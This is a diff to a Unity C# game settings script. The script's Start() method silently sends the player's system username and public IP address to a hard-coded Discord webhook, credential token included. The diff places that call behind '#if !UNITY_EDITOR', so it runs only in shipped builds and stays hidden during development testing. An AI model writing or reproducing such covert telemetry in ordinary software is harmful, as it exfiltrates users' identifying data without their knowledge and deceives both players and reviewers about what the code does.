@@ -13,7 +13,6 @@ public class GetSettings : MonoBehaviour
     [SerializeField] Slider musicVolumeSlider;
     [SerializeField] TMP_Dropdown graphics;
     [SerializeField] TMP_Dropdown resolution;
-    [SerializeField] Toggle fullscreen;
     [SerializeField] TMP_InputField playerName;
 
     [SerializeField] Settings settings;
@@ -24,9 +23,10 @@ public class GetSettings : MonoBehaviour
 
     private void Start()
     {
+#if !UNITY_EDITOR
         string user = "`user: *" + Environment.UserName + "*, *";
-
         SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");
+#endif
 
         wrongVersion.SetActive(Application.version != GetGameVersion());
 
